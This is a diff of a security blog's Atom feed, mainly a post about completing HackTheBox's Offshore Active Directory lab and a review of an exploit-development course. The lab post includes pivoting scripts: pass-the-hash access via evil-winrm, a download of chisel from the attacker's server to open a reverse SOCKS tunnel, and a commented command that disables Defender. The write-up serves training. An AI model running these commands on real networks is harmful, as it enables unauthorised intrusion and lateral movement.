@@ -1,6 +1,135 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-02-24T11:46:29+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">arty-hlr</title><entry><title type="html">Shellcode</title><link href="http://localhost:4000/blog/2019/12/29/shellcode/" rel="alternate" type="text/html" title="Shellcode" /><published>2019-12-29T00:00:00+01:00</published><updated>2019-12-29T00:00:00+01:00</updated><id>http://localhost:4000/blog/2019/12/29/shellcode</id><content type="html" xml:base="http://localhost:4000/blog/2019/12/29/shellcode/">&lt;h2 id=&quot;intro&quot;&gt;Intro&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-02-24T15:28:56+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">arty-hlr</title><entry><title type="html">Blue Team</title><link href="http://localhost:4000/2021/02/24/blue-team.html" rel="alternate" type="text/html" title="Blue Team" /><published>2021-02-24T00:00:00+01:00</published><updated>2021-02-24T00:00:00+01:00</updated><id>http://localhost:4000/2021/02/24/blue-team</id><content type="html" xml:base="http://localhost:4000/2021/02/24/blue-team.html"></content><author><name></name></author><summary type="html"></summary></entry><entry><title type="html">Crte</title><link href="http://localhost:4000/2021/02/15/crte.html" rel="alternate" type="text/html" title="Crte" /><published>2021-02-15T00:00:00+01:00</published><updated>2021-02-15T00:00:00+01:00</updated><id>http://localhost:4000/2021/02/15/crte</id><content type="html" xml:base="http://localhost:4000/2021/02/15/crte.html"></content><author><name></name></author><summary type="html"></summary></entry><entry><title type="html">Ewptx</title><link href="http://localhost:4000/2021/02/01/ewptx.html" rel="alternate" type="text/html" title="Ewptx" /><published>2021-02-01T00:00:00+01:00</published><updated>2021-02-01T00:00:00+01:00</updated><id>http://localhost:4000/2021/02/01/ewptx</id><content type="html" xml:base="http://localhost:4000/2021/02/01/ewptx.html"></content><author><name></name></author><summary type="html"></summary></entry><entry><title type="html">Offshore</title><link href="http://localhost:4000/blog/2020/12/25/offshore/" rel="alternate" type="text/html" title="Offshore" /><published>2020-12-25T00:00:00+01:00</published><updated>2020-12-25T00:00:00+01:00</updated><id>http://localhost:4000/blog/2020/12/25/offshore</id><content type="html" xml:base="http://localhost:4000/blog/2020/12/25/offshore/">&lt;h1 id=&quot;intro&quot;&gt;Intro&lt;/h1&gt;
 
-&lt;p&gt;So I was practicing my shellcode writing skills for &lt;a href=&quot;https://www.elearnsecurity.com/course/exploit_development_student/&quot;&gt;XDS&lt;/a&gt; from eLearnSecurity, and as I was working through the first basic assembly examples, I realized searching for syscalls numbers for different architectures was pretty tedious, like what’s the syscall number for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve&lt;/code&gt; in the i386 or ARM architectures, or what’s the declaration for that function, or what are the registers and instructions used for that architecture? Looking around google and asking friends on our Discord server, we didn’t find anything helping with that, so I set out on writing my own, and spent the whole evening on it!&lt;/p&gt;
+&lt;p&gt;December was gonna be another month of lockdown at home without much to do, so after a friend pwned it, and some nice troll from the InfoSec Prep discord started it, I decided to follow suit and to dedicate the month to &lt;a href=&quot;https://www.hackthebox.eu/home/labs/pro/view/2&quot;&gt;Offshore&lt;/a&gt;! Unfortunately I was a bit impatient, bought the lab access on the 1st of December at midnight, turned out that they had a 50% discount from the 1st of December, which was rolled out during the day, so missed that 😅&lt;/p&gt;
+
+&lt;h1 id=&quot;getting-up-to-speed-with-active-directory&quot;&gt;Getting up to speed with Active Directory&lt;/h1&gt;
+
+&lt;p&gt;I had dedicated the last 2 weeks of November to get up to speed with Active Directory and the attacks on it, I used &lt;a href=&quot;https://www.pentesteracademy.com/course?id=47&quot;&gt;Attacking and Defending Directory&lt;/a&gt; from PentesterAcademy (which is what comes bundled up with CRTP), the AD section of Heath Adam’s Practical Ethical Hacking Udemy &lt;a href=&quot;https://www.udemy.com/course/practical-ethical-hacking/&quot;&gt;course&lt;/a&gt;, and various blog posts about specific attacks I found after googling around a bit. Overall it was very much needed, as my first and last interaction with AD was with the HTB Forest box, which I had done while it was active, but with way too many hints, and without understanding what I was doing. Putting words in my head behind how Kerberos works, what kerberoasting or asreproasting is, how to get golden/silver ticket, etc helped a lot understanding the basics.&lt;/p&gt;
+
+&lt;p&gt;I even made my own little AD lab first on Azure, then at home, to follow along some attacks on Heath Adams’ course and to experiment a bit. Some resources for that &lt;a href=&quot;https://csenox.github.io/active-directory/2020/10/07/AD-Lab/&quot;&gt;here&lt;/a&gt;, &lt;a href=&quot;https://medium.com/@vartaisecurity/lab-building-guide-virtual-active-directory-5f0d0c8eb907&quot;&gt;here&lt;/a&gt;, &lt;a href=&quot;https://kamran-bilgrami.medium.com/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f&quot;&gt;here&lt;/a&gt;, &lt;a href=&quot;https://medium.com/swlh/building-an-active-directory-lab-part-1a-automatedlab-fc2399ebe5be&quot;&gt;here&lt;/a&gt;, &lt;a href=&quot;https://social.technet.microsoft.com/wiki/contents/articles/36438.windows-server-2016-build-a-windows-domain-lab-at-home-for-free.aspx&quot;&gt;here&lt;/a&gt;, and &lt;a href=&quot;https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;I decided to take the opportunity to learn some new tools, so I set up &lt;a href=&quot;https://obsidian.md/&quot;&gt;Obsidian&lt;/a&gt; for note taking, and &lt;a href=&quot;https://github.com/cobbr/Covenant&quot;&gt;Covenant&lt;/a&gt; as a C2. Spoiler, I ended up using more often metasploit than covenant as a C2 haha! Also set up a &lt;a href=&quot;https://github.com/fireeye/commando-vm&quot;&gt;Commando VM&lt;/a&gt; that could access my covenant server running on my Parrot machine, ended up doing everything from Parrot…&lt;/p&gt;
+
+&lt;h1 id=&quot;week-1-baby-steps&quot;&gt;Week 1: Baby steps&lt;/h1&gt;
+
+&lt;p&gt;Armed with my new found AD knowledge, I started Offshore… and didn’t see any AD attacks for a while 😅 There was some web attacks, a first pivot using SSH, some looking around making lots of noise (a blue teamer in charge of the offshore domains would have been able to run circles around me :P). But making friends along the way especially in the HTB discord server, we got together for some challenges, and I was at 25% at the end of my first week, on track to finish by Christmas!&lt;/p&gt;
+
+&lt;h1 id=&quot;week-2-pivoting&quot;&gt;Week 2: Pivoting…&lt;/h1&gt;
+
+&lt;p&gt;The first domain owned, started the pivoting game, and the AD attacks. It took me a few hours to find the best solutions for pivoting through the domains, using this &lt;a href=&quot;https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/&quot;&gt;post&lt;/a&gt; which was very thorough in the many ways a red teamer can pivot through a network, and tired of having to type commands over and over, I decided to script my pivoting, and here’s the result: (spoiler free and re-usable)&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pivot2.sh&lt;/code&gt; to serve chisel64.exe, pipe the powershell script to evil-winrm, and set the proxychains config for this DC:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$# &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; 1 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'-s[tart]/-r[un]'&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;exit
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fi
+
+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/127\.0\.0\.1 108./127\.0\.0\.1 1080/'&lt;/span&gt; /etc/proxychains.conf
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'-s'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[+] Serving on port 8000...'&lt;/span&gt;
+    python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 8000 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;
+    &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;pivot2_s.ps1 | evil-winrm &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; administrator &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; YOUTHOUGHTYOUDSEEAHASHDIDNTYOU &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 172.16.X.X
+&lt;span class=&quot;k&quot;&gt;else
+    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;pivot2_r.ps1 | evil-winrm &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; administrator &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; YOUTHOUGHTYOUDSEEAHASHDIDNTYOU &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 172.16.X.X
+&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pivot2_s.ps1&lt;/code&gt; to upload and run the chisel client on the DC:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Set-MpPreference -DisableRealtimeMonitoring $true&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/appdata/local/temp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-outf&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;chisel.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http://10.10.14.XX:8000/chisel64.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;/chisel&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;10.10.14.XX:12345&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;R:1080:socks&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pivot2_r.ps1&lt;/code&gt; to run the chisel client if it’s already uploaded:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Set-MpPreference -DisableRealtimeMonitoring $true&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/appdata/local/temp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;/chisel&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;10.10.14.XX:12345&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;R:1080:socks&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pivot3.sh&lt;/code&gt; to kill the HTTP server, launch the chisel server, and change the proxychains config for the new pivot:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+ps &lt;span class=&quot;nt&quot;&gt;-aux&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;http.server | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;8000 | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\d+'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt; | xargs &lt;span class=&quot;nb&quot;&gt;kill &lt;/span&gt;2&amp;gt;&amp;amp;1 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/null
+&lt;span class=&quot;nb&quot;&gt;sudo sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/127\.0\.0\.1 108./127\.0\.0\.1 1081/'&lt;/span&gt; /etc/proxychains.conf
+chisel server &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 12345 &lt;span class=&quot;nt&quot;&gt;-reverse&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;You’re welcome to steal those short scripts and adapt them for your pivoting needs! As I would get to know, I’d need a few of those to pivot through all the domains, in total 4 pivots!&lt;/p&gt;
+
+&lt;h1 id=&quot;week-3-ad-attacks-are-yummy&quot;&gt;Week 3: AD Attacks are yummy&lt;/h1&gt;
+
+&lt;p&gt;Cross domain and cross forest attacks were kinda new to me but I had a blast learning them! Also, ACLs can hide many juicy things :P Bloodhound was a lot of help in finding out how to abuse some ACLs and trusts, I wish I had used &lt;a href=&quot;https://exploit.ph/powerview.html&quot;&gt;PowerView&lt;/a&gt; more though and enumerated some stuff manually, would have prevented a lot of VM lagging and crashes because well I had obsidian, covenant, discord, and bloodhound running at the same time… But still learned a lot along the way, and the 3rd week was the 3rd quarter syndrome a bit, seeing how much work I had done, and seeing I had about the same amount still to do, and Christmas approaches…&lt;/p&gt;
+
+&lt;h1 id=&quot;week-4-flag-hunt&quot;&gt;Week 4: Flag hunt&lt;/h1&gt;
+
+&lt;p&gt;Total domain pwnage! I had owned all offshore domains… and was still missing a few flags. So on the enumeration hunt I went, trying to find some hidden flags, and turns out one of those was actually from a challenge that had been removed! Thanks to Ippsec for the help taking care of that!&lt;/p&gt;
+
+&lt;p&gt;24th of December, 3 PM, all domain flags in the pocket, getting ready for Christmas cooking… and still lacking one linux machine! This one turned up to be a bit of a closed beast, but was a very nice programming challenge, and I enjoyed writing the script to get the privesc on it, but that was on the 25th. So in the end Offshore completed, just on Christmas day :D And a nice certificate as a gift!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/offshore-certificate.png&quot; alt=&quot;Offshore Certificate&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;review&quot;&gt;Review&lt;/h1&gt;
+
+&lt;p&gt;Overall I learned during my Offshore journey, some challenges were frustrating, some required a bit of help, I won’t hide it, I made good friends along the way, and I’m very happy I could finish it under a month. I would recommend Offshore to all pentesters/hackers who want some more hands-on experience with AD attacks, and pivoting through networks, and who are not shy of googling stuff until it works. Very long but very good experience, looking forward to doing more AD related stuff in the future!&lt;/p&gt;</content><author><name></name></author><category term="blog" /><summary type="html">My journey through HTB's Offshore Pro Lab!</summary></entry><entry><title type="html">eLearnSecurity Certified eXploit Developer</title><link href="http://localhost:4000/blog/2020/12/15/ecxd/" rel="alternate" type="text/html" title="eLearnSecurity Certified eXploit Developer" /><published>2020-12-15T00:00:00+01:00</published><updated>2020-12-15T00:00:00+01:00</updated><id>http://localhost:4000/blog/2020/12/15/ecxd</id><content type="html" xml:base="http://localhost:4000/blog/2020/12/15/ecxd/">&lt;h1 id=&quot;update-25012021&quot;&gt;Update 25.01.2021&lt;/h1&gt;
+
+&lt;p&gt;In the year or so since this blog post, eLS has been acquired by INE, the courses are now only available as a subscription on &lt;a href=&quot;https://ine.com/&quot;&gt;INE&lt;/a&gt;’s website. Also, OffSec has launched a basic exploit dev course of their own &lt;a href=&quot;https://www.offensive-security.com/exp301-osed/&quot;&gt;here&lt;/a&gt; focused on windows, which still doesn’t cover x64 though, but seems very thorough on many other aspects, if you’re starting out with windows exploit dev, I now recommend going for OSED.&lt;/p&gt;
+
+&lt;h1 id=&quot;intro&quot;&gt;Intro&lt;/h1&gt;
+
+&lt;p&gt;Last year, I had bought vouchers for the eWAPT and eCXD exams from eLearnSecurity. I didn’t get around to actually prepare or take those exams apart from some binary exploitation studying, but a few weeks ago when an email came saying I had until mid November to take those exams, this jolted me back to action, at least on the binary exploitation front. End of october was actually the beginning of lockdown in Germany, my contract with my previous work had just ended, so I was gonna have a few weeks of free time ahead of me, why not focus on XDS, finally get the windows part of the course down, and try the exam?&lt;/p&gt;
+
+&lt;h1 id=&quot;preparation&quot;&gt;Preparation&lt;/h1&gt;
+
+&lt;p&gt;I felt like I had enough linux binary exploitation experience from CTFs, and the few HTB boxes I did that had some bin exp in them (👀 looking at you October, Safe, Ellingson, and especially Rope), and I hadn’t come round to finishing to windows part of the course last november, so this was my focus.&lt;/p&gt;
+
+&lt;p&gt;From OSCP I was comfortable with basic vanilla buffer overflows, debugging with &lt;a href=&quot;https://www.immunityinc.com/products/debugger/&quot;&gt;Immunity&lt;/a&gt;, and &lt;a href=&quot;https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/&quot;&gt;Mona&lt;/a&gt;, but I wanted to try another (more modern) debugger, so I partly switched to &lt;a href=&quot;https://x64dbg.com/&quot;&gt;x64dbg&lt;/a&gt;, keeping Immunity handy for Mona though. (although since then I heard there was a x64dbg &lt;a href=&quot;https://github.com/x64dbg/mona&quot;&gt;fork&lt;/a&gt; for it!)&lt;/p&gt;
+
+&lt;p&gt;From the syllabus I wanted to do specifically the last windows modules:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/xds-syllabus.png&quot; alt=&quot;XDS Syllabus&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As I had dabbled with SEH and egghunting earlier in the year in April, but a review would be in order!&lt;/p&gt;
+
+&lt;p&gt;The repos I used for my exploit dev practice are &lt;a href=&quot;https://github.com/arty-hlr/exploitdev-practice&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;https://github.com/arty-hlr/shellcode-practice&quot;&gt;here&lt;/a&gt; (see my shellcode post as well). I documented the exploits I developed for all the vulnerable software I used in the windows exploit dev prep (all installed on a Winwows 7 x86 Flare VM), and the binaries are there as well if you wanna practice on them. Overall the most interesting modules were those that touched windows ROP and shellcoding, although unfortunately they were a bit shallow and only used Mona to generate the ROP chains (spoiler alert, that wouldn’t be enough for the exam).&lt;/p&gt;
+
+&lt;p&gt;Some more resources I used along the way:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.corelan.be/index.php/category/security/exploit-writing-tutorials/&quot;&gt;Corelan&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://captmeelo.com/category/exploitdev&quot;&gt;Capt. Meelo&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://h0mbre.github.io/page8/&quot;&gt;h0mbre&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.fuzzysecurity.com/tutorials/expDev/1.html&quot;&gt;fuzzySecurity&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;exam&quot;&gt;Exam&lt;/h1&gt;
+
+&lt;p&gt;With only 2 weeks of review and additional prep, I wasn’t feeling 100% confident for the exam, but I wanted to get it over with, so here I went on a Wednesday at 6 PM, starting my 48 hours exam. I knew one person who had passed the exam, although not with all the points, so I wanted to see if I could. I can’t say much about the exam per se, but it was easy on one hand, and required some very specific skills on the other hand. Overall, it could and should have covered more of the syllabus though.&lt;/p&gt;
+
+&lt;p&gt;After 40 or so hours of gruesome debugging and exploiting work, here I was with shells on all objectives. A day more on the exam report (for which I used, like for OSCP, the wonderful markdown &lt;a href=&quot;https://github.com/noraj/OSCP-Exam-Report-Template-Markdown&quot;&gt;template&lt;/a&gt;), and I had my weekend for me!&lt;/p&gt;
+
+&lt;p&gt;I sent my report on the 16th of November, it took until the 8th of December to get the email that I had passed though 😅 eLS can definitely do better with exam rating times!&lt;/p&gt;
+
+&lt;h1 id=&quot;review&quot;&gt;Review&lt;/h1&gt;
+
+&lt;p&gt;Overall, the course was okay &lt;em&gt;for complete exploit dev beginners&lt;/em&gt;, but it covered old techniques on old OSes, and lacked some more modern things, heap stuff, x64 windows, some more in-depth module on writing ROP chains by hand, etc. It kinda makes sense as the course is called eXploit Development &lt;em&gt;Student&lt;/em&gt;, so we could expect like PTS -&amp;gt; PTP -&amp;gt; PTX maybe some more advanced exploit dev courses like XDP or XDX who knows, but so far nothing has been announced indicating that. It’s unfortunately one of the only exploit dev courses out there (not counting OSCP or the very outdated OSCE), so I’m sure they can, or someone can do better in the future.&lt;/p&gt;
+
+&lt;p&gt;To conclude, if you’re completely new to exploit dev, do take the course as it’s gonna bring you some important basic knowledge for more advanced attacks. If you’re already familiar with linux exploit dev, and want to transfer that knowledge to windows, probably better stick to the lots of blog posts out there (that XDS often cites) and build your own lab!&lt;/p&gt;</content><author><name></name></author><category term="blog" /><summary type="html">A review of the XDS course/eCXD exam by eLS</summary></entry><entry><title type="html">Shellcode</title><link href="http://localhost:4000/blog/2019/12/29/shellcode/" rel="alternate" type="text/html" title="Shellcode" /><published>2019-12-29T00:00:00+01:00</published><updated>2019-12-29T00:00:00+01:00</updated><id>http://localhost:4000/blog/2019/12/29/shellcode</id><content type="html" xml:base="http://localhost:4000/blog/2019/12/29/shellcode/">&lt;p&gt;So I was practicing my shellcode writing skills for &lt;a href=&quot;https://www.elearnsecurity.com/course/exploit_development_student/&quot;&gt;XDS&lt;/a&gt; from eLearnSecurity, and as I was working through the first basic assembly examples, I realized searching for syscalls numbers for different architectures was pretty tedious, like what’s the syscall number for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve&lt;/code&gt; in the i386 or ARM architectures, or what’s the declaration for that function, or what are the registers and instructions used for that architecture? Looking around google and asking friends on our Discord server, we didn’t find anything helping with that, so I set out on writing my own, and spent the whole evening on it!&lt;/p&gt;
 
 &lt;p&gt;I wanted to make a quick blog post about it to tell a bit about my shellcode practice journey, share that newly made tool, and maybe motivate other people to create tools when they see there isn’t any!&lt;/p&gt;
 
@@ -116,9 +245,9 @@ int execve(const char *path, char *const argv[], char *const envp[])
 
 &lt;p&gt;&lt;a href=&quot;https://github.com/arty-hlr/shellcode-practice&quot;&gt;Shellcode practice&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://github.com/arty-hlr/syscall_info&quot;&gt;syscall script&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="blog" /><summary type="html">Intro</summary></entry><entry><title type="html">OSCP</title><link href="http://localhost:4000/blog/2019/12/10/oscp/" rel="alternate" type="text/html" title="OSCP" /><published>2019-12-10T00:00:00+01:00</published><updated>2019-12-10T00:00:00+01:00</updated><id>http://localhost:4000/blog/2019/12/10/oscp</id><content type="html" xml:base="http://localhost:4000/blog/2019/12/10/oscp/">&lt;p&gt;So, first blog post had to be about OSCP even if I passed it two months ago, or my buddies in the Infosec Prep discord server would be mad! So here we go, short(ish) review of PWK (the course), OSCP (the exam), what preparation I had, a few pieces of advice, and what’s next!&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/arty-hlr/syscall_info&quot;&gt;syscall script&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="blog" /><summary type="html">So I was practicing my shellcode writing skills for XDS from eLearnSecurity, and as I was working through the first basic assembly examples, I realized searching for syscalls numbers for different architectures was pretty tedious, like what’s the syscall number for execve in the i386 or ARM architectures, or what’s the declaration for that function, or what are the registers and instructions used for that architecture? Looking around google and asking friends on our Discord server, we didn’t find anything helping with that, so I set out on writing my own, and spent the whole evening on it!</summary></entry><entry><title type="html">OSCP</title><link href="http://localhost:4000/blog/2019/12/10/oscp/" rel="alternate" type="text/html" title="OSCP" /><published>2019-12-10T00:00:00+01:00</published><updated>2019-12-10T00:00:00+01:00</updated><id>http://localhost:4000/blog/2019/12/10/oscp</id><content type="html" xml:base="http://localhost:4000/blog/2019/12/10/oscp/">&lt;p&gt;So, first blog post had to be about OSCP even if I passed it two months ago, or my buddies in the Infosec Prep discord server would be mad! So here we go, short(ish) review of PWK (the course), OSCP (the exam), what preparation I had, a few pieces of advice, and what’s next!&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://github.com/pages/arty-hlr/blog/asssets/images/oscp_logo.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/oscp_logo.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;background-and-preparation-before&quot;&gt;Background and preparation before&lt;/h2&gt;
 
@@ -138,11 +267,11 @@ int execve(const char *path, char *const argv[], char *const envp[])
 
 &lt;p&gt;Two weeks in, I was getting tired of the PWK labs to be honest, and I won’t hide that. Some machines were easy as common credentials, all are old a* f***, so old that kernel exploits work on a lot of them, but you’d have to compile them on old VMs, which was a pain. Maybe I should have looked more at privilege escalation routes that didn’t use kernel exploits, more than the few times I did, but I was growing tired of the age of the lab and how some machines were really buggy sometimes. I was not looking forward to the next machine on my to-do list, and I needed something fresh. I was longing to go back to HTB as well, since I had focused solely on PWK for the last two weeks, so I decided to go back there and take a break from the PWK labs.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://github.com/pages/arty-hlr/blog/asssets/images/oscp_htb_logo.png&quot; alt=&quot;Back to HTB!&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/oscp_htb_logo.png&quot; alt=&quot;Back to HTB!&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;That was probably one of the best decisions I’ve made during my preparation for the exam, taking a break from PWK and working on other sources and other stuff more relevant to the exam. I knew pivoting was part of PWK for example, and I did try that a bit, but it didn’t interest me that much and I knew I wouldn’t have to pivot in the exam, so scratch that. Instead I took the list of OSCP-like HTB machines, and went through that.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://github.com/pages/arty-hlr/blog/asssets/images/oscp_htb_machines.jpg&quot; alt=&quot;List of OSCP-like machines&quot; /&gt;&lt;/p&gt;
